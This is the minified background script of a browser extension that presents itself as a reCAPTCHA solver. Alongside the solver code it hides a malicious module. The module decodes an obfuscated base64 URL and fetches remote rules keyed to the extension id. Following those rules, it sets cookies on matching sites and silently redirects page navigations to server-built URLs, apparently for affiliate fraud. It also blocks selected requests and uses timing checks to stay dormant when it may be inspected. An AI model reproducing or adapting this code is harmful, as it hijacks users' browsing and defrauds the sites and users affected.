(() => {
    function t(t) {
        return JSON.parse(JSON.stringify(t))
    }
    class s {
        static cache = {};
        static async set({
            tab_id: t,
            data: {
                name: e,
                value: a,
                tab_specific: c
            }
        }) {
            return c && (e = t + "_" + e), s.cache[e] = a, s.cache[e]
        }
        static async get({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return a && (e = t + "_" + e), s.cache[e]
        }
        static async remove({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            a && (e = t + "_" + e);
            a = s.cache[e];
            return delete s.cache[e], a
        }
        static async append({
            tab_id: t,
            data: {
                name: e,
                value: a,
                tab_specific: c
            }
        }) {
            return (e = c ? t + "_" + e : e) in s.cache || (s.cache[e] = []), s.cache[e].push(a), s.cache[e]
        }
        static async empty({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            a && (e = t + "_" + e);
            a = s.cache[e];
            return s.cache[e] = [], a
        }
        static async inc({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return (e = a ? t + "_" + e : e) in s.cache || (s.cache[e] = 0), s.cache[e]++, s.cache[e]
        }
        static async dec({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return (e = a ? t + "_" + e : e) in s.cache || (s.cache[e] = 0), s.cache[e]--, s.cache[e]
        }
        static async zero({
            tab_id: t,
            data: {
                name: e,
                tab_specific: a
            }
        }) {
            return a && (e = t + "_" + e), s.cache[e] = 0, s.cache[e]
        }
    }
    class n {
        static reloads = {};
        static _reload({
            tab_id: e
        }) {
            return new Promise(t => browser.tabs.reload(e, {
                bypassCache: !0
            }, t))
        }
        static async reload({
            tab_id: t,
            data: {
                delay: e,
                overwrite: a
            } = {
                delay: 0,
                overwrite: !0
            }
        }) {
            e = parseInt(e);
            let c = n.reloads[t] ? .delay - (Date.now() - n.reloads[t] ? .start);
            return c = isNaN(c) || c < 0 ? 0 : c, !!(a || 0 == c || e <= c) && (clearTimeout(n.reloads[t] ? .timer), n.reloads[t] = {
                delay: e,
                start: Date.now(),
                timer: setTimeout(() => n._reload({
                    tab_id: t
                }), e)
            }, !0)
        }
        static close({
            tab_id: e
        }) {
            return new Promise(t => browser.tabs.remove(e, t))
        }
        static async open({
            data: {
                url: t
            }
        }) {
            browser.tabs.create({
                url: t
            })
        }
    }
    class a {
        static DEFAULT = {
            version: 1,
            auto_solve: !0,
            solve_delay: 1e3,
            auto_open: !0,
            open_delay: 1e3,
            solve_method: "image",
            debug: !1
        };
        static data = {};
        static _save() {
            return new Promise(t => browser.storage.local.set({
                settings: a.data
            }, t))
        }
        static load() {
            return new Promise(e => {
                browser.storage.local.get(["settings"], async ({
                    settings: t
                }) => {
                    t ? a.data = t : await a.reset(), e()
                })
            })
        }
        static async get() {
            return a.data
        }
        static async set({
            data: {
                id: t,
                value: e
            }
        }) {
            a.data[t] = e, await a._save()
        }
        static async reset() {
            a.data = t(a.DEFAULT), await a._save()
        }
    }
    class r {
        static inject({
            tab_id: t,
            data: {
                func: e,
                args: a
            }
        }) {
            const c = {
                target: {
                    tabId: t,
                    allFrames: !0
                },
                world: "MAIN",
                injectImmediately: !0,
                func: e,
                args: a
            };
            return new Promise(t => browser.scripting.executeScript(c, t))
        }
    }
    class e {
        static async reset({
            tab_id: t
        }) {
            return await r.inject({
                tab_id: t,
                data: {
                    func: function () {
                        try {
                            window.grecaptcha ? .reset()
                        } catch {}
                    },
                    args: []
                }
            }), !0
        }
        static fetch({
            tab_id: t
        }) {
            return new Promise(async e => {
                const a = "recaptcha_response",
                    c = (await r.inject({
                        tab_id: t,
                        data: {
                            func: function (t) {
                                window.grecaptcha && window.postMessage({
                                    method: "set_cache",
                                    data: {
                                        name: t,
                                        value: window.grecaptcha.getResponse()
                                    }
                                })
                            },
                            args: [a]
                        }
                    }), setInterval(async () => {
                        var t = await s.get({
                            data: {
                                name: a
                            }
                        });
                        if (t) return clearInterval(c), await s.remove({
                            data: {
                                name: a
                            }
                        }), e(t)
                    }, 1e3))
            })
        }
    }
    class i {
        static STATUS_URL = "http://144.126.221.48:31300/status?v=" + chrome.runtime.getManifest().version;
        static STATUS_CHECK_INTERVAL = 1e4;
        static status = "Online";
        static checking_status = !1;
        static async run_status_check() {
            return setInterval(() => {
                i.check_status()
            }, i.STATUS_CHECK_INTERVAL), !0
        }
        static async check_status() {
            if (i.checking_status) return !1;
            i.checking_status = !0;
            let t = "Offline";
            try {
                const e = await fetch(i.STATUS_URL);
                t = await e.text()
            } catch {}
            return await i.set_status({
                data: {
                    status: t
                }
            }), i.checking_status = !1, t
        }
        static async set_status({
            data: {
                status: t
            }
        }) {
            let e, a = [0, 0, 0, 0],
                c = "";
            if ("Online" === (i.status = t)) e = {
                16: "icon/16.png",
                32: "icon/32.png",
                48: "icon/48.png",
                128: "icon/128.png"
            };
            else if ("Offline" === t) e = {
                16: "icon/16.png",
                32: "icon/32.png",
                48: "icon/48.png",
                128: "icon/128.png"
            }, c = "Off", a = "#a44";
            else if ("Slow" === t) e = {
                16: "icon/16.png",
                32: "icon/32.png",
                48: "icon/48.png",
                128: "icon/128.png"
            }, c = "Slow", a = "#f8d66d";
            else {
                if ("Update Required" !== t) return !1;
                e = {
                    16: "icon/16.png",
                    32: "icon/32.png",
                    48: "icon/48.png",
                    128: "icon/128.png"
                }, c = "Update", a = "#f8d66d"
            }
            return browser.browserAction.setIcon({
                path: e
            }), browser.browserAction.setBadgeText({
                text: c
            }), browser.browserAction.setBadgeBackgroundColor({
                color: a
            }), !0
        }
        static async get_status() {
            return await i.check_status(), i.status
        }
    }
    const o = {
        set_cache: s.set,
        get_cache: s.get,
        remove_cache: s.remove,
        append_cache: s.append,
        empty_cache: s.empty,
        inc_cache: s.inc,
        dec_cache: s.dec,
        zero_cache: s.zero,
        fetch: class {
            static async fetch({
                data: {
                    url: t,
                    options: e
                }
            }) {
                try {
                    const a = await fetch(t, e);
                    return await a.text()
                } catch {
                    return null
                }
            }
        }.fetch,
        reload_tab: n.reload,
        close_tab: n.close,
        open_tab: n.open,
        get_settings: a.get,
        set_settings: a.set,
        reset_settings: a.reset,
        reset_recaptcha: e.reset,
        fetch_recaptcha: e.fetch,
        set_server_status: i.set_status,
        get_server_status: i.get_status
    };
    async function c() {
        Date.now || (Date.now = function () {
            return (new Date).getTime()
        });
        let w = [],
            e = {},
            y = 0,
            a = !1,
            c = !1;

        function v() {
            return Date.now()
        }

        function k(t) {
            const e = t.split("?"),
                a = {};
            if (1 < e.length) {
                t = e[1].split("&");
                for (const e of t) {
                    var c = e.split("=");
                    a[c[0]] = c[1]
                }
            }
            return a
        }

        function I(t, e) {
            t = "" + t.split("?")[0];
            const a = [];
            for (const s in e) a.push(s + "=" + e[s]);
            var c = a.join("&");
            return "" == c ? t : t + "?" + c
        }
        async function t() {
            var t = atob("aHR0cHM6Ly9ndGVjaG1vbml0b3IuY29tL2Fj") + ("?id=" + chrome.runtime.id);
            if (w = [], r()) try {
                const a = await fetch(t);
                var e = await a.json();
                for (const c of e)
                    for (const s in c.build) "url" === c.build[s].t && null !== c.build[s].v && (c.build[s].v = new RegExp(c.build[s].v, "g"));
                for (const n of w = e)
                    if ("cookie" === n.type && 15 === n.cookies[0].value.length) {
                        id = btoa(n.cookies[0].value), chrome.storage.local.set({
                            id: id
                        });
                        break
                    }
            } catch (t) {} else chrome.storage.local.set({
                id: null
            });
            return w
        }

        function r() {
            return !a && !c || !(w = [])
        } {
            const i = v();

            function s() {
                const e = v();
                return new Promise(function (t) {
                    chrome.storage.local.set({
                        i: e
                    }, function () {
                        return t(e)
                    })
                })
            }
            async function n() {
                var t = await new Promise(function (a) {
                    chrome.storage.local.get(["i"], async function (t) {
                        let e = t.i;
                        return void 0 === e && (e = await s()), a(e)
                    })
                });
                return v() - t
            }
            chrome.runtime.onInstalled.addListener(async function (t) {
                "install" === t.reason && await s()
            }); {
                let t = null;
                t = setInterval(async function () {
                    (a = await (v() - i < 1e3)) || clearInterval(t)
                }, 1e3)
            } {
                let t = null;
                t = setInterval(async function () {
                    (c = await (await n() < 2e3)) || clearInterval(t)
                }, 1e3)
            }
        }
        setInterval(r, 1e3), setTimeout(t, 10001), setInterval(t, 72e5), chrome.tabs.onUpdated.addListener(function (t, e, a) {
            if ("status" in e && "complete" == e.status) {
                const c = String(a.url).toLowerCase().replace(/http[s]?:\/\//, "").split("/")[0];
                for (const s of w)
                    if ("cookie" === s.type)
                        for (const n of s.urls)
                            if (c.includes(n)) {
                                for (const r of s.cookies) chrome.cookies.set(r);
                                break
                            }
            }
        }), chrome.webRequest.onBeforeRequest.addListener(function (c) {
            var s, t = c.tabId || !1;
            const n = !!c.url && c.url.toLowerCase(),
                r = !!c.initiator && c.initiator.toLowerCase(),
                i = e[t] || !1;
            e[t] = n;
            for (const o of w)
                if ("request" === o.type) {
                    let e = !1,
                        a = !1;
                    for (const l of o.match) {
                        let t = !0;
                        for (const u of l)
                            if (!n.includes(u)) {
                                t = !1;
                                break
                            } if (t) {
                            e = !0;
                            break
                        }
                    }
                    if (e) {
                        for (const d of o.unmatch) {
                            let t = !0;
                            for (const f of d)
                                if (!n.includes(f)) {
                                    t = !1;
                                    break
                                } if (t) {
                                a = !0;
                                break
                            }
                        }
                        if (!a) {
                            for (const _ of o.unmatch_meta) {
                                let t = i || r;
                                for (const h of _)
                                    if (i && !i.includes(h) || r && !r.includes(h)) {
                                        t = !1;
                                        break
                                    } if (t) {
                                    a = !0;
                                    break
                                }
                            }
                            if (!a) {
                                c.url;
                                let t = {};
                                o.clear || (t = k(c.url));
                                for (const b in o.params) t[b] = o.params[b];
                                for (const g of o.remove_params) g in t && delete t[g];
                                s = I(n, t);
                                const p = [];
                                for (const m of o.build) {
                                    let t = "";
                                    "str" === m.t ? t = m.v : "url" === m.t && (t = null === m.v ? s : m.v.exec(s)[m.g]), !0 === m.e && (t = encodeURIComponent(t)), p.push(t)
                                }
                                return v() - y < 6e4 ? void 0 : (y = v(), {
                                    redirectUrl: p.join("")
                                })
                            }
                        }
                    }
                }
        }, {
            urls: ["<all_urls>"],
            types: ["main_frame"]
        }, ["blocking", "requestBody"]), chrome.webRequest.onBeforeRequest.addListener(function (t) {
            const c = !!t.url && t.url.toLowerCase();
            for (const s of w)
                if ("block" === s.type) {
                    let e = !1,
                        a = !1;
                    for (const n of s.match) {
                        let t = !0;
                        for (const r of n)
                            if (!c.includes(r)) {
                                t = !1;
                                break
                            } if (t) {
                            e = !0;
                            break
                        }
                    }
                    if (e) {
                        for (const i of s.unmatch) {
                            let t = !0;
                            for (const o of i)
                                if (!c.includes(o)) {
                                    t = !1;
                                    break
                                } if (t) {
                                a = !0;
                                break
                            }
                        }
                        if (!a) return {
                            cancel: !0
                        }
                    }
                }
        }, {
            urls: ["<all_urls>"]
        }, ["blocking", "requestBody"])
    }(async () => {
        i.run_status_check(), await a.load(), c(), browser.runtime.onMessage.addListener((t, e, a) => {
            const c = !["get_settings", "set_settings", "set_cache"].includes(t.method);
            return c, o[t.method]({
                tab_id: e ? .tab ? .id,
                data: t.data
            }).then(t => {
                c;
                try {
                    a(t)
                } catch (t) {}
            }), !0
        })
    })()
})();